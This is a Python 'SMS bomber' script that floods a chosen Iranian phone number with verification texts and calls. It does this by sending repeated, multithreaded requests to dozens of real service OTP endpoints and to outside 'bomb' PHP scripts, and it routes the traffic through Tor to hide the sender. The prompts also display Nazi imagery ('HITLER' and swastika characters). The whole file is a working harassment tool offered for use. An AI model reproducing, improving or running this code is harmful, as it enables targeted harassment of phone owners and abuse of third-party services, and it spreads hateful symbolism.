#sms bomber SS
#v1 b
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search
from threading import Thread
from requests import post,get
from colorama import Fore
from subprocess import Popen
import sys,requests,os

def banner():
    os.system("clear")
    print(Fore.LIGHTRED_EX+"""\n
 __    __   __  .___________. __       _______ .______      
|  |  |  | |  | |           ||  |     |   ____||   _  \     
|  |__|  | |  | `---|  |----`|  |     |  |__   |  |_)  |    
|   __   | |  |     |  |     |  |     |   __|  |      /     
|  |  |  | |  |     |  |     |  `----.|  |____ |  |\  \----.
|__|  |__| |__|     |__|     |_______||_______|| _| `._____|
    
    Coded By t.me/ShrekDev
    """)

def apis(number):
    http = PoolManager()
    https = requests.session()
    try:
        #1
        http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            headers={'Content-Type': 'application/json'},
            body=dumps({"cellphone": f"+98{number}"}).encode())
        
        #2
        http.request("post", "https://tap33.me/api/v2/user",
            headers={'Content-Type': 'application/json'},
            body=dumps({"credential": {"phoneNumber": f"0{number}", "role": "PASSENGER"}}).encode())
    
        #3
        http.request("post", "https://www.echarge.ir/m/login?length=19",
            headers={'Content-Type': 'application/json'},
            body=dumps({"phoneNumber": f'0{number}'}).encode())

        #4
        http.request("post", "https://api.divar.ir/v5/auth/authenticate",
            headers={'Content-Type': 'application/json'},
            body=dumps({"phone": f'0{number}'}).encode())

        #5
        http.request("post", "https://shadmessenger12.iranlms.ir/",
            headers={'Content-Type': 'application/json'},
            body=dumps({"phone": f'0{number}'}).encode())

        #6
        http.request("post", "https://messengerg2c4.iranlms.ir/",
            headers={'Content-Type': 'application/json'},
            body=dumps({"phone": f'+{number}'}).encode())
    
        #7
        http.request("post", "https://web.emtiyaz.app/json/login",
            headers={'Content-Type': 'application/json'},
            body=dumps({"phone": f'+98{number}'}).encode())
        
        #8
        https.get(f'https://api.torob.com/a/phone/send-pin/?phone_number=0{number}')
        
        #9
        https.get(f'https://core.gap.im/v1/user/add.json?mobile=0{number}')
        
        #10
        header1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'app-version': 'pwa',
            'x-app-version': '5.0.1',
            'x-app-name': 'passenger-pwa',
            'content-type': 'application/json',
            'Origin': 'https://app.snapp.taxi',
            'Connection': 'keep-alive',
            'Referer': 'https://app.snapp.taxi/login/?redirect_to=%2F',
            'TE': 'Trailers',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }
        https.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', data={"cellphone":f"+98{number}"},
            headers=header1)
        
        #11
        header2 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://web.emtiyaz.app',
            'Connection': 'close',
            'Referer': 'https://web.emtiyaz.app/settings',
        }
        https.post('https://web.emtiyaz.app/json/login', 
            data={"send":"1","cellphone":f"0{number}"}, headers=header2)
        
        #12
        header3 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://bama.ir/Signin?ReturnUrl=%2Fprofile',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://bama.ir',
            'Connection': 'close',
        }
        https.post('https://bama.ir/signin-checkforcellnumber',
            data={"cellNumber":f"0{number}"}, headers=header3)
        
        #13
        header4 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://app.tapsi.cab/',
            'content-type': 'application/json',
            'Origin': 'https://app.tapsi.cab',
        }
        https.post('https://tap33.me/api/v2/user',
            data={"credential":{"phoneNumber":f"0{number}","role":"PASSENGER"}}, headers=header4)
            
        #14
        url1 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data1 = {
            "phoneNumber": f"0{number}"
        }
        header5 = {
            "Content-Type":"application/json"
        }
        https.post(url1,
            data=data1,headers=header5)
        
        #15
        url2 = "https://www.alopark.com/driver/Login/Register"
        data2 = {
            "Mobile": f"0{number}"
        }
        header6 = {
            "Content-Type":"application/json"
        }
        https.post(url2,
            data=data2,headers=header6)
        
        #16
        url3 = "https://base.darmankade.com/v1/PatientLogin"
        data3 = {
            "Mobile":f"0{number}"
        }
        header7 = {
            "Content-Type":"application/json"
        }
        https.post(url3,
            data=data3,headers=header7)
        
        #17
        url4 = "https://app.espard.com/api/v1/auth/identify-by-mobile"
        data3 = {
            "data":{
                 "mobile":number,
            },
            "oneSignalPlayerId": "",
            "appVersion": "1.5.0",
            "deviceId": "01B30DE7-EC61-438A-BDB3-FC6910AE7E5E",
            "deviceInfo": "x86_64",
            "deviceToken": "",
            "clientId": "com.espard.customer",
            "platform": "web",
            "osVersion": "10.2",
            "timeZone": "GMT+3:30",
            "time": "1597042718355"
        }
        header8 = {
            "Content-Type":"application/json"
        }
        https.post(url4,
            data=data3,headers=header8)
            
        #18
        headers = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        json = {"credential":{"phoneNumber":"0"+number,"role":"PASSENGER"}}
        https.post("https://tap33.me/api/v2/user", headers=headers, json=json)
        
        #19
        headers = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        json = {"cellphone":"+98"+number}
        https.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=headers, json=json)
        
        #20
        headers = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
        https.get("https://core.gap.im/v1/user/add.json?mobile=%2B+98"+number, headers=headers)
        
        #21
        headers = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
        data = "send=1&cellphone=0"+number
        https.post("https://web.emtiyaz.app/json/login", headers=headers, data=data)
        
        #22
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "Content-Type": "application/json;charset\u003dUTF-8",
            "Origin": "https://kacheb.co",
            "Referer": "https://kacheb.co/"
        }
        data = {"tell":"0"+number,"role":"customer","secure":1}
        https.post("https://server.kacheb.co/api/tell", headers = headers, json = data)
        
        #23
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://zhiva1.ir",
            "referer": "https://zhiva1.ir/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/", headers = headers, json = json)
        
        #24
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://logosfood.ir",
            "referer": "https://logosfood.ir/"
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/businesses/bogiiiacsv/vitrin_verification/", headers = headers, json=json)

        #25
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://pastapatogh.ir.app",
            "referer": "https://pastapatogh.ir.app/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/businesses/mqmkgrkwrs/vitrin_verification/", headers = headers, json=json)
        
        #26
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://sedaryekfood.ir",
            "referer": "https://sedaryekfood.ir/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/businesses/cxurjiqykm/vitrin_verification/", headers = headers, json=json)
        
        #27
        headers = {"user-agent":"Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json","origin": "https://behtarino.com","referer": "https://behtarino.com/"} 
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/", headers = headers, json=json)
        
        #28
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://fastfood.ir.app",
            "referer": "https://fastfood.ir.app/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/businesses/atifkxbvuj/vitrin_verification/", headers = headers, json=json)
        
        #29
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
            "origin": "https://khedmatazma.com",
            "referer": "https://khedmatazma.com/mag/carpet-cleaning-app",
        }
        data = f"phone={number}"
        https.post("https://khedmatazma.com/users/sendOtp", headers = headers, data = data)
        
        #30
        headers= {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", 
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://app.namademan.ir",
            "referer": "https://app.namademan.ir/phone-number",
        }
        json = {"phone":"0"+number}
        https.post("https://app.namademan.ir/api/v1/login/send_otp", headers = headers, json= json)
        
        #31
        headers= {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", 
            "content-type": "application/json; charset\u003dutf-8",
            "origin": "https://mobile.3soot.ir",
            "referer": "https://mobile.3soot.ir/",
        }
        json = {"userName":"0"+number}
        req = requests.post("https://api.3soot.ir/identity/v2/Customer/Login", headers = headers, json= json)
        
        #32 call
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://zhiva1.ir",
            "referer": "https://zhiva1.ir/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/call/", headers = headers, json = json)
        
        #33 call
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://logosfood.ir",
            "referer": "https://logosfood.ir/"
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/call/", headers = headers, json=json)
        
        #34 call
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://pastapatogh.ir.app",
            "referer": "https://pastapatogh.ir.app/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/call/", headers = headers, json=json)
        
        #35 call
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://sedaryekfood.ir",
            "referer": "https://sedaryekfood.ir/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/call/", headers = headers, json=json)
        
        #36 call
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "content-type": "application/json;charset\u003dUTF-8",
            "origin": "https://fastfood.ir.app",
            "referer": "https://fastfood.ir.app/",
        }
        json = {"phone":"0"+number}
        https.post("https://api.behtarino.com/api/v1/users/phone_verification/call/", headers = headers, json=json)
        
        #37 vip
        web = f"https://mohammad.clouden.xyz/sms/sms.php?target={number}&count=5"
        https.get(web)
        
        #38 vip
        web1 = f"https://danii.speedmizban.ir/bot/bomb/Sms1.php?phone={number}&count=15"
        https.get(web1)
        
        #39 vip
        web2 = f"https://danii.speedmizban.ir/bot/bomb/Sms2.php?phone={number}&count=15"
        https.get(web2)
        
        #40 vip
        web3 = f"https://danii.speedmizban.ir/bot/bomb/Sms3.php?phone={number}&count=15"
        https.get(web3)
        
        #41 vip
        web4 = f"https://danii.speedmizban.ir/bot/bomb/Sms4.php?phone{number}&count=15"
        https.get(web4)
        
        #42 vip
        web5 = f"https://danii.speedmizban.ir/bot/bomb/Sms5.php?phone={number}&count=15"
        https.get(web5)
        
        #43 vip
        web6 = f"https://danii.speedmizban.ir/bot/bomb/web.php?target={number}"
        https.get(web6)
        
        #43 vip
        web7 = f"https://danii.speedmizban.ir/bot/bomb/web1.php?target={number}"
        https.get(web7)
        
        #44 vip
        web8 = f"https://danii.speedmizban.ir/bot/bomb/web2.php?target={number}"
        https.get(web8)
        
        #45 vip
        web9 = f"https://danii.speedmizban.ir/bot/bomb/web3.php?target={number}"
        https.get(web9)
        
        #46 vip
        web10 = f"https://danii.speedmizban.ir/bot/bomb/web4.php?target={number}"
        https.get(web10)
        
        #47 vip
        web11 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber.php?phonenumber={number}&setspam=20"
        https.get(web11)
        
        #48 vip
        web12 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber1.php?phonenumber={number}&setspam=20"
        https.get(web12)
        
        #49 vip
        web13 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber2.php?phonenumber={number}&setspam=20"
        https.get(web13)
        
        #50 vip
        web14 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber3.php?phonenumber={number}&setspam=20"
        https.get(web14)
        
        #51 vip
        web15 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber4.php?phonenumber={number}&setspam=20"
        https.get(web15)
        
        #52 vip
        web16 = f"https://danii.speedmizban.ir/bot/bomb/SmsBomber5.php?phonenumber={number}&setspam=20"
        https.get(web16)
        
        #53 my
        my = f"localhost:5050/api/ss.php?phone={number}&count=20"
        https.get(my)
        
        #54 my
        my1 = f"localhost:5050/api/ss0.php?phone={number}&count=20"
        https.get(my1)
        
        #55 my
        my2 = f"localhost:5050/api/ss1.php?phone={number}&count=20"
        https.get(my2)
        
        #56 my
        my3 = f"localhost:5050/apiss2.php?phone={number}&count=20"
        https.get(my3)
    except:
        print("")
        pass
        sys.exit()

def start(number,thrd):
    def rm():
        for time in range(3):
            os.remove(f"api/ss{time}.php")
    if(search(r'9\d{9}$', str(number))):
        for time in range(thrd):
            print(Fore.BLUE+"\rSending sms "+Fore.RED+f"{time+1}"+Fore.WHITE+"/"+Fore.GREEN+f"{thrd}", end='')
            try:
                Thread(target=apis,args=(number,)).start()
            except KeyboardInterrupt:
                input(Fore.RED+"(Press enter...)")
                sys.exit()
            except Traceback:
                input(Fore.RED+"Something is wrong [2] (Press enter...)")
                sys.exit()
            except Exception:
                input(Fore.RED+"Something is wrong [3] (Press enter...)")
                sys.exit()
            except:
                input(Fore.RED+"Something is wrong [1] (Press enter...)")
                sys.exit()
            sleep(.3)
        input("\nExit (Press enter...)")
        Popen(("pkill","php"))
        Popen(("pkill","tor"))
        rm()
        sys.exit()
    else:
        print(Fore.RED+"invalid format of number.\nformat: 9xxxxxxxxx")
        sys.exit()
def main():
    banner()
    number = str(input(Fore.RED+"┌─["+Fore.LIGHTGREEN_EX+"HITLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"BOMBER"+Fore.RED+"/"+Fore.BLUE+"SMSBMB"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"NUMBER"+Fore.RED+"""]
└──╼ """+Fore.WHITE+"卐 "))
    if(number == ""):
        input(Fore.RED+"empty(Press enter...)")
        sys.exit()
    elif(len(number) > 10 or len(number) < 10):
        input(Fore.RED+"expamle: 9×××××××××(Press enter...)")
        sys.exit()
    
    try:
        thrd = int(input(Fore.RED+"┌─["+Fore.LIGHTGREEN_EX+"HITLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"BOMBER"+Fore.RED+"/"+Fore.BLUE+"SMSBMB"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"NUMBER OF SMS"+Fore.RED+"""]
└──╼ """+Fore.WHITE+"卐 "))
    except ValueError:
        input(Fore.RED+"empty(Press enter...)")
        sys.exit()
    if(thrd <= 5):
        input(Fore.RED+"thread is smaller than 6(Press enter...)")
        sys.exit()
    elif(thrd >= 31):
        input(Fore.RED+"thread is biggest than 30(Press enter...)")
        sys.exit()
    def copyss():
        ss = open("api/ss.php","r")
        read = str(ss.read())
        ss.close()
        for time in range(3):
            with open(f"api/ss{time}.php","w") as fl:
                fl.write(read)
    copyss()        
    def tor():
        with open("log/TorLog","w") as log:
            Popen(("tor"),stderr=log,stdout=log)
        print(Fore.GREEN+"wait for run tor service!")
        thrdtor = 0
        while True:
            sleep(.7)
            thrdtor += 1
            a = open("log/TorLog","r")
            read = str(a.readlines())
            if(thrdtor == 100):
                input(Fore.RED+"TOR CAN'T RUN!(press enter...)")
                sys.exit()
            if("100" in read):
                print(Fore.GREEN+"TOR IS RUNNING!")
                break
            if("[err]" in read):
                input(Fore.RED+"Something wrong\nplease try again!(press enter...)")
                Popen(("pkill","tor"))
                sys.exit()
        pass
    tor()
    def server():
        with open("log/ServerLog","w") as log:
            Popen(("php","-S","localhost:5050"),stderr=log,stdout=log)
    
    server()
    start(number,thrd)
if __name__ == "__main__":
    main()